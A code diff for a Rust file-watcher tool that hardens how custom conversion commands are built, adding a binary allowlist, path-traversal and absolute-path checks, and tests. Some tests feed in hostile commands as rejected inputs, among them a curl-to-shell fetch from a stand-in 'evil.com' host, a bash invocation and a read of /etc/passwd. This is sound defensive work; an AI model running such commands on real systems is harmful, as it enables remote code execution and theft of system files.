@@ -3,7 +3,7 @@ use std::process::Stdio;
 use std::sync::Arc;
 
 use anyhow::{bail, Result};
-use log::warn;
+use log::{error, warn};
 use tokio::process::Command;
 
 use crate::config::global::DiskSpaceConfig;
@@ -14,7 +14,7 @@ use crate::utils::path::get_base_name;
 
 use super::disk::check_disk_space;
 use super::namer::OutputNamer;
-
+#[allow(clippy::too_many_arguments)]
 pub async fn process_external(
     watcher_name: String,
     file_name: String,
@@ -37,7 +37,11 @@ pub async fn process_external(
 
     let output_folder_path = PathBuf::from(output_folder);
     let base_name = get_base_name(&file_name);
-    let ext = rule.output_ext.as_deref().unwrap_or(".mp4").trim_start_matches('.');
+    let ext = rule
+        .output_ext
+        .as_deref()
+        .unwrap_or(".mp4")
+        .trim_start_matches('.');
     let output_path = match OutputNamer::generate_path(
         &output_folder_path,
         &base_name,
@@ -46,8 +50,22 @@ pub async fn process_external(
         ext,
     ) {
         Ok(p) => p,
-        Err(_) => {
-            OutputNamer::generate_with_counter(&output_folder_path, &base_name, "custom", ext)
+        Err(e) => {
+            warn!(
+                "generate_path failed for {}: {}; falling back",
+                file_name, e
+            );
+            match OutputNamer::generate_with_counter(&output_folder_path, &base_name, "custom", ext)
+            {
+                Ok(p) => p,
+                Err(e2) => {
+                    error!(
+                        "Final output path generation failed for {}: {}; aborting",
+                        file_name, e2
+                    );
+                    return;
+                }
+            }
         }
     };
 
@@ -78,12 +96,18 @@ async fn execute_custom(
     file_name: &str,
     rule: &CustomRule,
 ) -> Result<()> {
-    let command = rule.command.as_deref()
+    let command = rule
+        .command
+        .as_deref()
         .ok_or_else(|| anyhow::anyhow!("Custom rule has no command"))?;
     validate_command_template(command)?;
 
     let basename = get_base_name(file_name);
-    let ext = rule.output_ext.as_deref().unwrap_or(".mp4").trim_start_matches('.');
+    let ext = rule
+        .output_ext
+        .as_deref()
+        .unwrap_or(".mp4")
+        .trim_start_matches('.');
 
     let argv = build_argv(
         command,
@@ -117,9 +141,34 @@ async fn execute_custom(
     Ok(())
 }
 
+/// Binaries permitted in custom rules. Using a fixed allowlist prevents
+/// arbitrary code execution via embedded override injection.
+const ALLOWED_BINARIES: &[&str] = &[
+    "ffmpeg",
+    "ffprobe",
+    "ffplay",
+    "gs",
+    "ghostscript",
+    "pandoc",
+    "qpdf",
+    "pdftotext",
+    "pdfimages",
+    "pdftoppm",
+    "pdfinfo",
+    "img2pdf",
+    "convert",
+    "magick",
+    "identify", // ImageMagick
+    "HandBrakeCLI",
+    "sox",
+    "soxi",
+];
+
 /// Split template into argv tokens, then replace placeholders in each token
 /// individually. This preserves paths containing whitespace as single argv
-/// elements.
+/// elements. Validates expanded tokens for path traversal and unsafe absolute
+/// paths (allowing only those that come from `{input}`, `{output}`, or
+/// `{output_folder}` substitution).
 fn build_argv(
     template: &str,
     input: &str,
@@ -129,18 +178,39 @@ fn build_argv(
     output_folder: &str,
 ) -> Result<Vec<String>> {
     let tokens: Vec<&str> = template.split_whitespace().collect();
+    if tokens.is_empty() {
+        bail!("Empty command template");
+    }
     let mut argv = Vec::with_capacity(tokens.len());
 
-    for token in tokens {
-        let replaced = token
+    for (original_token, replaced) in tokens.iter().map(|t| {
+        let r = t
             .replace("{input}", input)
             .replace("{output}", output)
             .replace("{basename}", basename)
             .replace("{ext}", ext)
             .replace("{output_folder}", output_folder);
+        (*t, r)
+    }) {
+        // Validate no path traversal in expanded tokens via proper component iteration
+        let p = std::path::Path::new(&replaced);
+        for component in p.components() {
+            if matches!(component, std::path::Component::ParentDir) {
+                bail!("Expanded token '{}' contains '..' path traversal", replaced);
+            }
+        }
 
-        if replaced.contains("..") {
-            bail!("Expanded token '{}' contains '..' path traversal", replaced);
+        // Reject absolute paths in tokens that did NOT come from a safe placeholder.
+        // Tokens containing {input}, {output}, or {output_folder} are expected to
+        // expand to absolute file/folder paths and are allowed through.
+        let is_safe_placeholder = original_token.contains("{input}")
+            || original_token.contains("{output}")
+            || original_token.contains("{output_folder}");
+        if !is_safe_placeholder && std::path::Path::new(&replaced).is_absolute() {
+            bail!(
+                "Expanded token '{}' is an absolute path — only relative paths allowed",
+                replaced
+            );
         }
 
         argv.push(replaced);
@@ -152,6 +222,28 @@ fn build_argv(
 fn validate_command_template(template: &str) -> Result<()> {
     if template.contains("..") {
         bail!("Template contains '..' path traversal");
+    }
+
+    // Extract the program name (first token before any space)
+    let program = template
+        .split_whitespace()
+        .next()
+        .ok_or_else(|| anyhow::anyhow!("Empty command template"))?;
+
+    // Extract just the binary name (after path components like /usr/bin/ffmpeg → ffmpeg)
+    let binary_name = std::path::Path::new(program)
+        .file_name()
+        .and_then(|n| n.to_str())
+        .unwrap_or(program);
+
+    if !ALLOWED_BINARIES.contains(&binary_name) {
+        bail!(
+            "Command '{}' (binary '{}') is not in the allowed list. \
+             Permitted binaries: {}",
+            program,
+            binary_name,
+            ALLOWED_BINARIES.join(", ")
+        );
     }
     Ok(())
 }
@@ -171,7 +263,10 @@ mod tests {
             "/out/",
         )
         .unwrap();
-        assert_eq!(argv, vec!["ffmpeg", "-i", "/in/video.mp4", "/out/video_h264.mp4"]);
+        assert_eq!(
+            argv,
+            vec!["ffmpeg", "-i", "/in/video.mp4", "/out/video_h264.mp4"]
+        );
     }
 
     #[test]
@@ -190,21 +285,51 @@ mod tests {
     }
 
     #[test]
-    fn test_build_argv_rejects_traversal() {
+    fn test_build_argv_rejects_absolute_in_non_placeholder() {
+        // A token that doesn't expand from a safe placeholder must not produce an absolute path
         let result = build_argv(
-            "ffmpeg -i {input} -filter {basename}",
+            "ffmpeg -i {input} /etc/passwd",
             "/in/video.mp4",
             "",
-            "../../etc",
+            "video",
             "",
             "/out/",
         );
         assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("absolute path"));
+
+        // Safe: {output} expands to absolute path — must be allowed
+        let result = build_argv(
+            "ffmpeg -i {input} {output}",
+            "/in/video.mp4",
+            "/out/output.mp4",
+            "video",
+            "mp4",
+            "/out/",
+        );
+        assert!(result.is_ok());
     }
 
     #[test]
     fn test_validate_template_rejects_dotdot() {
         assert!(validate_command_template("ffmpeg -i ../secret").is_err());
         assert!(validate_command_template("ffmpeg -i {input}").is_ok());
+    }
+
+    #[test]
+    fn test_validate_template_allowlist_accepts_allowed_binary() {
+        assert!(validate_command_template("ffmpeg -i {input} {output}").is_ok());
+        assert!(validate_command_template("/usr/bin/ffmpeg -i {input} {output}").is_ok());
+        assert!(
+            validate_command_template("gs -dBATCH -dNOPAUSE -sDEVICE=pdfwrite -o {output}").is_ok()
+        );
+        assert!(validate_command_template("HandBrakeCLI -i {input} -o {output}").is_ok());
+    }
+
+    #[test]
+    fn test_validate_template_allowlist_rejects_disallowed_binary() {
+        assert!(validate_command_template("curl http://evil.com/payload.sh | sh").is_err());
+        assert!(validate_command_template("/bin/bash -c id").is_err());
+        assert!(validate_command_template("python3 /tmp/exploit.py").is_err());
     }
 }
